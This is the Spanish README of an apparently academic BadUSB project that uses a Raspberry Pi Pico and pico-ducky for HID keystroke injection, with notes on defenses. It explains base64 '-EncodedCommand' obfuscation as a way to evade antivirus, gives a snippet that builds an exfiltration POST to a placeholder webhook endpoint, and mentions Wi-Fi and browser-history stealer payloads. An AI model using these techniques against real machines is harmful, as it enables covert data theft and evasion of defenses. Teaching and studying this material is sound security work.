# Proyecto BadUSB: Análisis Experimental de Inyección HID y Defensas
**Curso:** Seguridad Computacional (IIC2531)
**Integrantes:** Paolo Rojas, Rafael Uribe, Matías Vergara

## ⚠️ Advertencia Ética y de Uso
Este repositorio contiene material educativo desarrollado estrictamente para un entorno académico y de laboratorio controlado. Los scripts aquí presentes tienen fines de demostración y auditoría de seguridad. **No deben ser utilizados en equipos de terceros sin autorización explícita.** Los datos sensibles (rutas, nombres de redes y endpoints) han sido anonimizados para proteger la privacidad de los desarrolladores y cumplir con las políticas del curso.

---

## 📂 Estructura del Repositorio

*   `/payloads_ejecutables/`: Contiene los archivos `payload.dd` finales (con los comandos **codificados en Base64**) listos para ser copiados a la Raspberry Pi Pico.
*   `/scripts_fuente/`: Contiene los scripts en PowerShell sin codificar (`.txt`). Sirven para que el equipo docente pueda auditar la lógica real detrás de la ofuscación.
*   `/evidencias/`: Capturas de pantalla y registros que respaldan los resultados del informe (exfiltración de datos, bloqueos de Windows Defender, pruebas fallidas con Secure Desktop).

---

## 🛠️ Requisitos de Hardware y Software

*   **Hardware:** Raspberry Pi Pico (RP2040) estándar (sin Wi-Fi) y cable USB.
*   **Software:**
    *   Firmware [CircuitPython 10.0.3](https://circuitpython.org/board/raspberry_pi_pico/) (`adafruit-circuitpython-raspberry_pi_pico-en_US-10.0.3.uf2`).
    *   Distribución [pico-ducky v4.0](https://github.com/dbisu/pico-ducky) (utilizamos la versión con soporte para teclados en Español, `WIN_ES`).

---

## 🧬 Entendiendo la Ofuscación (`-EncodedCommand`)

A lo largo del proyecto, los scripts de PowerShell en los archivos `.dd` están escritos como cadenas largas de letras y números. Esto se debe a una técnica de ofuscación mediante **codificación Base64**, invocada con el parámetro `-EncodedCommand` de PowerShell. 

**¿Por qué se implementó esta técnica?**
1.  **Integridad de caracteres (Bypass de Layout):** El firmware `WIN_ES` de pico-ducky no mapea perfectamente con el teclado latinoamericano. Los caracteres especiales (como `\`, `$`, `"` o `|`) se corrompían al ser tipeados a alta velocidad. Al codificar todo en Base64 (que solo usa letras y números), aseguramos que el comando se escriba exactamente como se planeó, sin importar la configuración regional del teclado de la víctima.
2.  **Evasión de firmas básicas:** Los antivirus buscan palabras clave en texto plano (como `Invoke-WebRequest`). Al pasar el comando a Base64, el motor de PowerShell lo decodifica internamente en memoria antes de ejecutarlo, evadiendo la detección estática básica (técnica fundamental para el ataque *Living off the Land*).

**¿Cómo generar tu propio payload codificado?**
Si deseas modificar un script o cambiar la URL del `[ENDPOINT_CONTROLADO]`, debes ejecutar el siguiente bloque en tu propio PowerShell (Windows):

```powershell
# 1. Escribe tu comando real entre comillas SIMPLES (importante para que no se ejecute antes de tiempo)
$mi_comando = 'Invoke-RestMethod -Uri "https://webhook.site/[ENDPOINT_CONTROLADO]" -Method Post -Body "Prueba"'

# 2. Convierte el texto a bytes Unicode y luego a Base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($mi_comando)
[Convert]::ToBase64String($bytes)
```
El resultado será una cadena de texto (ej: `SQBuAHYAbwBrAGUAL...`). Debes copiar esa cadena y pegarla en tu archivo `payload.dd` justo después de `powershell -NoP -Exec Bypass -EncodedCommand`.

---

## 🚀 Guía de Instalación Básica

1.  **Flashear el firmware:**
    *   Desconecta la Pico.
    *   Mantén presionado el botón `BOOTSEL` y conéctala al PC.
    *   Aparecerá una unidad llamada `RPI-RP2`.
    *   Arrastra el archivo `.uf2` de CircuitPython a esa unidad. La Pico se reiniciará.
2.  **Instalar pico-ducky:**
    *   Aparecerá una nueva unidad llamada `CIRCUITPY`.
    *   Copia la carpeta `lib` y los archivos `.py` base de pico-ducky (`code.py`, `duckyinpython.py`, `pins.py`, etc.) a la raíz de `CIRCUITPY`.
    *   *Nota de seguridad:* **No** se debe copiar el archivo `boot.py` en este repositorio, ya que su inclusión oculta la unidad `CIRCUITPY` (modo sigiloso). Al omitirlo, garantizamos que la unidad siga visible para facilitar las pruebas de laboratorio de forma segura.

---

## 🧪 Cómo Reproducir la Demostración Básica (Entorno Seguro)

Para validar que el dispositivo funciona sin ejecutar código ofensivo, realice la "Prueba de Concepto 1":

1.  Copia el archivo `01_notepad.dd` de la carpeta `/payloads_ejecutables/`.
2.  Pega el archivo en la raíz de la unidad `CIRCUITPY` de la Pico.
3.  Desconecta la Pico y ciérrala de forma segura.
4.  Cierra todas las ventanas del sistema operativo.
5.  Conecta la Pico a un equipo **de su propiedad**.
6.  **Resultado esperado:** Tras 3 segundos, se abrirá el Bloc de Notas de Windows y escribirá automáticamente el texto "Hello World!".

---

## 🔐 Payloads Avanzados (Referencia Arquitectónica)

Los payloads `03_wifi_stealer.dd` y `04_history_stealer.dd` (junto con sus scripts fuente en `/scripts_fuente/`), que realizan extracción de datos (Wi-Fi e Historial) mediante peticiones HTTP y ofuscación en Base64, se incluyen en este repositorio **únicamente como referencia arquitectónica y de auditoría**. 

Todos los scripts han sido debidamente anonimizados (eliminando endpoints activos, rutas personales y credenciales reales) para garantizar un entorno seguro. Por lo tanto, **la reproducción práctica de este repositorio se limita estrictamente a la demostración controlada** utilizando el archivo `01_notepad.dd`. 

*(Nota técnica documentada en el informe: Durante el desarrollo, se comprobó que Windows Defender bloquea activamente las descargas de herramientas externas y el Secure Desktop neutraliza el ataque si el equipo está bloqueado (`Win+L`), demostrando la efectividad de la defensa en profundidad).*